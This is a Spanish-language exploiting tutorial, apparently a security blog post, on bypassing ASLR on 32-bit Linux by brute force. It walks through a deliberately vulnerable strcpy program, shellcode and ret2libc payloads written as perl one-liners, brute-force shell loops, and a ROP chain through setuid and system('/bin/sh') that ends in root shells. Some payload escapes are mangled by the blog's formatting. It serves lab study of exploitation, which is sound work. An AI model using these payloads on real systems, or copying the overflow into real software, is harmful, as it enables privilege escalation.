---
layout: es/blog-detail
comments: true
title: "ASLR: Ser cartero en la ciudad donde cambian los nombres de las calles"
date: 2018-08-17T10:14:00+00:00
categories:
    - Exploiting
tags:
    - 32 bit
    - 32 bit
    - ASLR
    - ASLR bypass
    - buffer overflow
    - buffer overflow
    - buffer overrun
    - bypass
    - exploit
    - exploiting
    - gadget
    - linux
    - overflow
    - overrun
    - re2lib
    - ret2libc
    - ropgadget
    - shellcode
    - stack
    - stack based
    - stack overflow
    - x86
    - x86
image_src: /assets/uploads/2018/08/PuffinSecurity-ASLR-Ser-cartero-en-la-ciudad-donde-cambian-los-nombres-de-las-calles-exploiting-e1563961172601.jpg
image_height: 467
image_width: 700
author: Yago Gutierrez
description: Esta preciosa mañana veremos en más profundidad el ASLR que atiende a las palabras Address Space Layout Randomization cuyo objetivo era evitar el ...
publish_time: 2018-08-17T10:14:00+00:00
modified_time: 2019-02-19T14:37:21+00:00
comments_value: 0
---
Esta  preciosa mañana (aunque no sé a qué hora leerás esto ) veremos en más profundidad el ASLR.

ASLR (que no ASMR) atiende a las palabras _Address Space Layout Randomization_. Es una técnica que se diseñó a comienzos de siglo junto a DEP/NX/W^X/etc cuyo objetivo tenía evitar el determinismo de las direcciones en el stack, de forma que un atacante que, en su laboratorio, imite en todos los aspectos posibles el sistema atacado, siga siendo incapaz de predecir en qué direcciones se cargarán las librerías, o se localizará el stack, o si hay fortuna y el binario es PIE, dónde se cargará el binario. Es evidente que esto es una gran dificultad que a saber cómo la sorteamos, pero para eso estamos aquí.  
Es fácil comprobar si un sistema tiene ASLR activado  
`$ sysctl kernel.randomize_va_space  
kernel.randomize_va_space = 2`  
Si tuviese como valor `0`, el ASLR estaría inhabilitado. En este caso está al nivel `2`, es decir ([…/sysctl/kernel.txt](https://www.kernel.org/doc/Documentation/sysctl/kernel.txt)) se aleatorizan las direcciones del heap, además de las que se aleatorizan con el nivel `1`: las reservadas con `mmap()`, la pila, y, aunque nos interesa menos porque aún no nos vemos las faces con el kernel, las direcciones del vDSO ([interesante](https://v0ids3curity.blogspot.com/2014/12/return-to-vdso-using-elf-auxiliary.html)). Teniendo en cuenta que se emplea `mmap()` para cargar las librerías y el binario, esto implica que se aleatorizan las direcciones base de todos estos componentes.  
Hasta ahora hemos trabajado con binarios no PIE, en un sistema con ASLR esto \_suele\_ permitir apenas un ret2plt, quizá algún ret2syscall sencillo, pero que solo daría para un execve() (que puede servir para un privesc o un remoto donde el programa explotado tiene redireccionados el `stdin` y el `stdout` al socket con la conexión que emplea el atacante, cosa muy rara, pero programas raros hay en todos lados, recuerdo que algo así hacían los programas de la máquina _Fusion_ de Exploit Exercises). Si el binario es grande, hay más probabilidad de encontrar lo que necesitamos, con uno pequeño todo es más difícil. Sin embargo, si nos encontramos frente a un binario PIE las cosas se oscurecen aún más si cabe, y se vuelve una obligación solventar este problema frontalmente. Puede lograrse de dos maneras: (la vulgar, pero siempre presente) mediante la fuerza bruta, o (la elegante) aprovechando un _memory leak_.

Ya aparecerá por aquí una entrada sobre _memory leaks_, aquí veremos la aplicación controlada (por contradictorio que suene) de la fuerza bruta.

Estudiemos cómo funciona el ASLR internamente. Distinguiremos tres zonas del proceso: el binario, librerías y/o resto de zonas reservadas con mmap(), y la pila. Cada una de estas zonas tiene una variable asignada en la estructura del proceso, siendo estas `delta_exec`, `delta_mmap` y `delta_stack`. Al cargarse el programa, el sistema coloca en esas variables valores parcialmente aleatorios, en los dos primeros valores, se aleatorizan 16 bits, y en el último, el del stack, 24 bits. Estos valores se suman a cada dirección base predefinida, obteniéndose un desplazamiento impredecible de dichos segmentos dentro del espacio virtual de direcciones del proceso.  
Vamos a estudiar la posición en la memoria de una variable cualquiera del stack en sucesivas ejecuciones en el mismo sistema estando activado el ASLR  

    $ cat aslr.c 
    #include <stdio.h>

int main()  
{  
int a;  
printf(«%pn», &a);  
return 0;  
}

$ gcc aslr.c -o aslr -m32

$ ./aslr  
0xffb8d8fc

$ ./aslr  
0xffef559c

$ ./aslr  
0xffbd3c2c

$ ./aslr  
0xffbd3a7c

$ ./aslr  
0xff899b3c

$ ./aslr  
0xffa6e9bc

$ ./aslr  
0xffc9380c

$ ./aslr  
0xfff70c9c

$ ./aslr  
0xffcf919c

$ ./aslr  
0xffda035c

$ ./aslr  
0xff82c1ac

$ ./aslr  
0xffc04b8c

$ ./aslr  
0xffdcc92c

$ ./aslr  
0xffc034bc

De acuerdo, vemos que varían 3 bytes de los 4 que forman la dirección, es decir, en principio, 24 bits.

0xffda035c = 11111111 **1**1011010 00000011 01011100
0xffdcc92c = 11111111 **1**1011100 11001001 00101100
0xffb8d8fc = 11111111 **1**0111000 11011000 11111100
0xffc9380c = 11111111 **1**1001001 00111000 00001100
0xffc04b8c = 11111111 **1**1000000 01001011 10001100

Vemos que el primer bit del segundo byte de cada dirección coincide. En el byte de menor importancia también coinciden dos bits, pero se debe a que es un offset. Podemos deducir que se aleatorizan solo 23 bits, y no 24. Sin embargo, el offset también nos interesa, ya que coinciden varios bits con bastante frecuencia. Hay que sumar que el stack debe estar alineado con 0x10, por lo que se reducen aún más los posibles sitios donde encontrar el stack. Todos estos factores aumentan la probabilidad de que al lanzar un ataque de fuerza bruta contra una dirección en concreto, se obtenga éxito.  
Recuperemos un viejo amigo  

    #include <stdio.h>
    #include <string.h>

void imprimir(char\* arg)  
{  
char buf\[128\];  
strcpy(buf, arg);  
printf(«%sn», buf);  
}

int main(int argc, char\*\* argv)  
{  
if(argc < 2) return 1;  
imprimir(argv\[1\]);  
return 0;  
}

Compilamos con NX desactivado y obtenemos con `ltrace` la dirección de ese momento de `buf`.  
`$ gcc vuln.c -o vuln -m32 -z execstack`

$ ltrace ./vuln \`cat sc.o«perl -e ‘print «A»x(140-31) . «xaaxaaxaaxff»‘\`  
\_\_libc\_start\_main(0x56601602, 2, 0xffa4cb84, 0x56601650 <unfinished …>  
strcpy(0xffa4ca30, «130013333152001300Ph//shh/bin211343PS2113411322260v315200A»…) = 0xffa4ca30  
puts(\[…\]) = 145  
— SIGSEGV (Segmentation fault) —  
+++ killed by SIGSEGV +++  
Luego una dirección válida para nuestro `buf` es `0xffa4ca30`. Un nopsled podría facilitar las cosas bastante, y todavía más si se encontrara en una variable de entorno, donde puede ocupar un tamaño bastante grande. Pero vamos a intentarlo primero empleando solo nuestro pequeño buffer.  

    #!/bin/sh
    i=0
    while :
    do
        echo "Intento: $i"
        ./vuln `cat sc.o``perl -e 'print "A"x(140-31) . "x30xcaxa4xff"'`
        i=$((i+1))
    done

Lo ejecutamos, y a esperar

Acabo de volver  (ya que estaba tardando), y ya ha acabado la fuerza bruta, en el intento 472449 (más anteriores ejecuciones, pues he probado varios scripts, para ver cuál era el más rápido y práctico, así que habría que sumar unos cuantos intentos más).  

    $ ./aslr.sh
    Intento: 0
    1�1�̀1�Ph//shh/bin��PS��1Ұ
                             AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA0ʤ�
    Segmentation fault (core dumped)
    Intento: 1
    1�1�̀1�Ph//shh/bin��PS��1Ұ
                             AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA0ʤ�
    Segmentation fault (core dumped)
       .
       .
       .
    Intento: 472446
    1�1�̀1�Ph//shh/bin��PS��1Ұ
                             AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA0ʤ�
    Segmentation fault (core dumped)
    Intento: 472447
    1�1�̀1�Ph//shh/bin��PS��1Ұ
                             AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA0ʤ�
    Segmentation fault (core dumped)
    Intento: 472448
    1�1�̀1�Ph//shh/bin��PS��1Ұ
                             AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA0ʤ�
    $ 

\[Perdón por olvidarme de hacerlo setuid :/\]  
Como no estaba aquí para cuando el maravilloso suceso ocurrió no puedo decir cuánto tiempo ha tardado. Es obvio que esto se trata de suerte, es la gracia de hacer una fuerza bruta, acabo de ejecutarlo de nuevo para calcular a qué velocidad se hacían los intentos, y lo ha logrado en el 1487. Blackngel lo conseguía en el intento número 22, gracias a hacerlo en una variable del entorno, en la que podía emplear un nopsled de gran tamaño.  
Vamos a probar con un setuid, para ver como saldría.  

    Intento: 23122
    1�1�̀1�Ph//shh/bin��PS��1Ұ
                             AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA0ʤ�
    # whoami
    root
    # 

En fin, es cuestión de «suerte», que antes haya tardado tanto y ahora no tarde ni un minuto… (también ahora está más ágil el ordenador y hace los intentos mucho más rápido).

Hemos conseguido bypassear ASLR, aprovechando que el proceso no cuenta con NX. Para evadir NX deberíamos hacer un ROP, como ya hemos visto. El problema es que en el ROP entran en juego más factores, aunque también depende evidentemente de cómo se haga el ROP. Un ROP en el que se emplean direcciones localizadas en segmentos donde se emplea una variable `delta` distinta, disminuye las probabilidades de éxito. Un ROP donde se usan direcciones del stack, de una librería (o varias, ya que todas las librerías son cargadas con `mmap()`, por lo que todas comparten `delta_mmap`) y del binario, requiere que en una ejecución confluyan las tres variables, `delta_stack`, `delta_mmap` y `delta_exec`, lo que es altamente improbable.

Sin embargo, empleando direcciones solo de la librería, se puede conseguir éxito, y de hecho con más probabilidad que con una del stack, ya que el stack tiene un factor de aleatorización de 24, y las librerías de 16. Veámoslo  

    $ ldd vuln
     linux-gate.so.1 (0xf77ba000)
     libc.so.6 => /lib32/libc.so.6 (0xf75e0000)
     /lib/ld-linux.so.2 (0xf77bc000)

Hemos obtenido una dirección base de cada librería válida, ahora la usaremos para obtener las direcciones de `system()` y `/bin/sh` en la libc  
`$ python2 ROPgadget/ROPgadget.py --binary /lib32/libc.so.6 --string /bin/sh --offset 0xf75e0000  
Strings information  
============================================================  
0xf773ccc8 : /bin/sh`

    $ readelf /lib32/libc.so.6 -a | grep system
       246: 00113c60    68 FUNC    GLOBAL DEFAULT   13 svcerr_systemerr@@GLIBC_2.0
       628: 0003a850    55 FUNC    GLOBAL DEFAULT   13 __libc_system@@GLIBC_PRIVATE
      1461: 0003a850    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0

`0x0003a850 + 0xf75e0000 = 0xf761a850`  
Perfesto. La explotación no puede ser más fácil. La recompensa llega en un segundo  
``$ cat aslr.sh  
#!/bin/sh  
i=0  
while :  
do  
echo "Intento: $i"  
./vuln `perl -e 'print "A"x140 . "x50xa8x61xf7" . "xaaxaaxaaxaa" . "xc8xccx73xf7"'`  
i=$((i+1))  
done``

$ ./aslr.sh  
Intento: 0  
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP�a�������s�  
Segmentation fault  
Intento: 1  
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP�a�������s�  
Segmentation fault  
.  
.  
.  
Intento: 195  
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP�a�������s�  
Segmentation fault  
Intento: 196  
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP�a�������s�  
Segmentation fault  
Intento: 197  
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP�a�������s�  
Illegal instruction  
Intento: 198  
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP�a�������s�  
\# whoami  
root  
#  
Tras cerrar la shell el programa rompe, pues no nos hemos preocupado de colocar la dirección de `exit()` como supuesto `ret` para `system()`  
`# exit  
Segmentation fault  
Intento: 199  
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP�a�������s�  
Segmentation fault  
[...]`  
Y continúa el script haciendo fuerza bruta. De hecho es gracioso que tras el comando `exit`, se obtenga root de nuevo en menos de un segundo.  
`Intento: 746  
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP�a�������s�  
Segmentation fault  
Intento: 747  
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP�a�������s�  
#`  
Hemos logrado una elevación de privilegios bypasseando ASLR y NX mediante un ROP así de sencillo.

Está claro que una cantidad tan grande de ejecuciones puede hacer saltar alguna alarma muy fácilmente, y de hecho no debe ser muy recomendable hacerlo. Claro que puede existir algún mecanismo que impida que un programa se ejecute cierta cantidad de veces en un periodo de tiempo tan corto… La forma «correcta» de evadir ASLR es mediante un memory leak («correcta» en el sentido de que sea más segura, porque en este caso «correcta» es cualquier técnica que te lleva al éxito, pero el exploiting no es la vida real… o ¿sí?

En un exploit remoto esto no funciona igual, un servidor puede efectuar un `fork()` para atender cada petición recibida. `fork()` crea un proceso exactamente igual al proceso padre, esto no modifica las variables `delta_*` (es una copia exacta del proceso padre), por lo que distintas peticiones serán atendidas por procesos con las mismas direcciones virtuales, lo que nos impide hacer fuerza bruta, ya que la gracia de la fuerza bruta es que varíen las direcciones. La fuerza bruta se podría hacer para distintas instancias del servidor completo, sería necesario matar al padre (puede bastar un SIGSEGV) y que en el sistema existiese un servicio que se encargue de reiniciar el servidor si este muere, de esta forma sí irían variando las direcciones y podríamos realizar nuestro ataque de esta forma. Esta característica que ahora nos impide la fuerza bruta, con los _memory leaks_ nos vendrá bien, y con el tema de los _canaries_ igualmente, ya que en ese caso sí seremos capaces de hacer fuerza bruta.  
Por otro lado, el servidor puede crear un hilo para atender cada petición, pero esto tampoco nos permite hacer la fuerza bruta.

Hemos visto que, aunque poco aconsejable, la fuerza bruta siempre es una opción.  
Nos vemos en el siguiente post, saludos.

Hace un [par de posts](/starting-from-the-base-attacks-to-base-frame-pointer-ebp/) propusimos un [reto](/starting-from-the-base-attacks-to-base-frame-pointer-ebp//#ctf) en el que nos encontramos a un viejo amigo:  

    #include <stdio.h>
    #include <string.h>

void imprimir(char\* arg)  
{  
char buf\[128\];  
strcpy(buf, arg);  
printf(«%sn», buf);  
}

int main(int argc, char\*\* argv)  
{  
if(argc < 2) return 1;  
imprimir(argv\[1\]);  
return 0;  
}

En esta ocasión pedíamos resolverlo de una forma original distinta a las ya dadas en otro [post](/?p=619) (una [en medio del post](/?p=619#en-medio-del-post) y otra [en el solucionario](/?p=619#solucionario-mepreguntosialguienleeraestetipodeurls)).  
Veamos el esquema de mi solución.

Direcciones altas
+-------------------+
|    0x00000000     | Aprovecharemos un 0x00000000 que se encuentre perdido en el stack
+-------------------+
|    &leave;ret     |
+-------------------+
|     &setuid()     |
+-------------------+
|       &ret        |
+-------------------+
|                   |
          .
          .
|                   |
+-------------------+
|       &ret        |
+-------------------+
|       &ret        | EIP(s)
+-------------------+
|     &buf - 4      | EBP(s) Aquí ponemos un EBP falso
+-------------------+ <- EBP (inicialmente)
|        ...        | (?? bytes, cosas de gcc, siempre se deja los juguetes por ahí tirados) Relleno
+-------------------+ <- Fin buf
|        ...        | Relleno (116 bytes)
+-------------------+
|    &"/bin/sh"     |
+-------------------+
|      &exit()      |
+-------------------+
|     &system()     |
+-------------------+ <- buf (128 bytes)
|        ...        |
+-------------------+ <- ESP (inicialmente)
  Direcciones bajas

Una vez que nos hemos hecho un esquema del proceso de explotación que vamos a emplear, lo pasamos a nuestro _perl one-line_ (ya, ya sé que mucha gente emplearía python, que quedaría más claro, pero Blackngel me ha marcado en esto, además, si lo hacemos en python, tendríamos que escribir más que con un _one-line_, recuerdo que @pastaCLS de CLS me bautizó como «el perl _one-liner_«).

Bien, una forma de calcular el relleno que debemos introducir sin el `create_pattern` de metasploit u otras herramientas es viendo el código en asm, fijándonos en concreto cómo es referenciado el buffer:  
`804844a: 8d 85 78 ff ff ff lea eax,[ebp-0x88]  
8048450: 50 push eax  
8048451: e8 aa fe ff ff call 8048300 <strcpy@plt>`  
Por tanto, buf se encuentra 0x88 (136 en dec) bytes bajo `EBP(s)`. Así que, introduciremos primero las direcciones &system, &exit, &»/bin/sh» más un relleno de 124 bytes.  

    0xf7f5ecc8 : /bin/sh (ROPgadget)
    0xf7e3c850 <system> (gdb)
    0xf7e30800 <exit> -> nope (byte 0x00 y dirs anteriores no sirven) -> 0xf7eb35c5 <_exit> (gdb)
    0xf7eb3d60 <setuid> (gdb)
    8048527: c3 ret    (objdump)

804846c: c9 leave  
804846d: c3 ret (objdump)

Ya podemos hacer casi todo el exploit, primero lo haremos colocando las direcciones que deberemos introducir como mínimo (seguramente tendremos que introducir varios `&ret`‘s para alcanzar un `0x00000000` que quede como argumento para `setuid()`, pero por ahora colocaremos solo un `&ret`)  
`perl -e 'print "x50xc8xe3xf7" . "xc5x35xebxf7" . "xc8xecxf5xf7" . "A"x124 . "xaaxaaxffxff" . "x27x85x04x08" . "x60x3dxebxf7" . "x6cx84x04x08"'`

Ahora revisemos el stack buscando un NULL cerquita  
``$ gdb -q vuln  
Reading symbols from vuln...(no debugging symbols found)...done.  
(gdb) disas imprimir  
Dump of assembler code for function imprimir:  
0x0804843b <+0>: push %ebp  
0x0804843c <+1>: mov %esp,%ebp  
0x0804843e <+3>: sub $0x88,%esp  
0x08048444 <+9>: sub $0x8,%esp  
0x08048447 <+12>: pushl 0x8(%ebp)  
0x0804844a <+15>: lea -0x88(%ebp),%eax  
0x08048450 <+21>: push %eax  
0x08048451 <+22>: call 0x8048300 <strcpy@plt>  
0x08048456 <+27>: add $0x10,%esp  
0x08048459 <+30>: sub $0xc,%esp  
0x0804845c <+33>: lea -0x88(%ebp),%eax  
0x08048462 <+39>: push %eax  
0x08048463 <+40>: call 0x8048310 <puts@plt>  
0x08048468 <+45>: add $0x10,%esp  
0x0804846b <+48>: nop  
0x0804846c <+49>: leave  
0x0804846d <+50>: ret  
End of assembler dump.  
(gdb) br *imprimir +50  
Breakpoint 1 at 0x804846d  
(gdb) run "`perl -e 'print "x50xc8xe3xf7" . "xc5x35xebxf7" . "xc8xecxf5xf7" . "A"x124 . "xaaxaaxffxff" . "x27x85x04x08" . "x60x3dxebxf7" . "x6cx84x04x08"'`"  
Starting program: /home/arget/vuln "`perl -e 'print "x50xc8xe3xf7" . "xc5x35xebxf7" . "xc8xecxf5xf7" . "A"x124 . "xaaxaaxffxff" . "x27x85x04x08" . "x60x3dxebxf7" . "x6cx84x04x08"'`"  
[...]AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]``

Breakpoint 1, 0x0804846d in imprimir ()  
(gdb) x $esp  
0xffffd2ac: 0x08048527 # &ret  
(gdb)  
0xffffd2b0: 0xf7eb3d60 # &setuid()  
(gdb)  
0xffffd2b4: 0x0804846c # &leave;ret  
(gdb)  
0xffffd2b8: 0xffffd300  
(gdb)  
0xffffd2bc: 0x080484d1  
(gdb)  
0xffffd2c0: 0xf7fb53dc  
(gdb)  
0xffffd2c4: 0xffffd2e0  
(gdb)  
0xffffd2c8: 0x00000000  
(gdb)  
(En el output del programa suprimo los bytes no imprimibles, porque ya me ha dado alguno un dolor de cabeza por desformatear el texto en el post, ya que algunos pueden indicar una tabulación vertical, salto de página o cosas similares que estropean el diseño del blog).  
Encontramos un NULL 5 posiciones más arriba, de modo que introduciremos 4 ret’s más.  
`perl -e 'print "x50xc8xe3xf7" . "xc5x35xebxf7" . "xc8xecxf5xf7" . "A"x124 . "xaaxaaxffxff" . "x27x85x04x08"x5 . "x60x3dxebxf7" . "x6cx84x04x08"'`  
La explotación ocurrirá de este modo:  
— El `leave` de imprimir() recoge en el EBP un frame falso que apunta 4 bytes bajo el comienzo de nuestro buffer (donde hemos colocado nuestro ROP `system("/bin/sh")+exit()`).  
— El `ret` de imprimir() recoge una dirección a otra instrucción `ret`, que a su vez recogerá otra dirección a `ret`, es simplemente una forma de llegar a donde queremos llegar, a dos posiciones tras el 0x00000000 (tienen que ser dos posiciones para que setuid() reconozca el 0x00000000 como argumento). Valdría también emplear un gadget pop;pop;pop;pop;ret y colocar relleno, pero he preferido esto, que además no modifica los registros.  
— El último `ret` recogerá &setuid, quien reconoce como argumento el 0x00000000 dos posiciones más allá, ya que la función cree que ha sido llamada con un `call`.  
— setuid() finaliza y ejecuta un `ret` donde debería estar su `EIP(s)`, lo que recoge en EIP la dirección de un `leave;ret`, el `leave` primero moverá de EBP a ESP la dirección buf-4, para hacer posteriormente un `pop ebp` que recogerá basura en el EBP e incrementará el ESP en 4 bytes, apuntando al comienzo de buf. Finalmente la instrucción `ret` recogerá del comienzo de buf la dirección &system dando comienzo al ROP clásico.

Vamos a hallar la dirección de buf y a ejecutarlo.  

    [unset environment LINES y COLUMNS]
    Breakpoint 2, 0x08048456 in imprimir ()
    (gdb) x $esp
    0xffffd210: 0xffffd220

``$ /home/arget/vuln "`perl -e 'print "x50xc8xe3xf7" . "xc5x35xebxf7" . "xc8xecxf5xf7" . "A"x124 . "x1cxd2xffxff" . "x27x85x04x08"x5 . "x60x3dxebxf7" . "x6cx84x04x08"'`"  
[...]AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]  
# whoami  
root  
#``  
Explotado.  
Este programita nos está dando para rato. ¿De cuántas formas distintas se puede explotar un programa?  
Saludos.